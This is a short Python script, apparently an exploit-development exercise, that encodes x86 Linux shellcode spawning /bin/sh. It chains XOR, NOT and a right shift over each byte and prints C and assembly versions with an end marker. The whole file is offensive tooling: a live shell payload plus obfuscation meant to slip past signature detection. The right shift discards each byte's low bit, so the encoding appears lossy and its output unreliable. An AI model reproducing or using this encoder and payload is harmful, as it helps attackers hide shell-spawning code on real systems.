#! /usr/bin/python
# Python Custom Encoder

shellcode = b"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80"

c_format = ""
asm_format = ""

print("Encoding shellcode...\n")

for x in bytearray(shellcode):
    # XOR
    y = x ^ 0xAA

    # NOT
    y = ~y
    y = y & 0xff

    # Shift Right 0x1
    y = y >> 0x1

    c_format += "\\x"
    c_format += "%02x" % y

    asm_format += "0x"
    asm_format += "%02x, " % y

# Adding null instruction
c_format += "\\x7f"
asm_format += "0x7f"

print("C version:", c_format, "\n")
print("ASM version:", asm_format, "\n")

print("Len: %d" % len(bytearray(shellcode)))
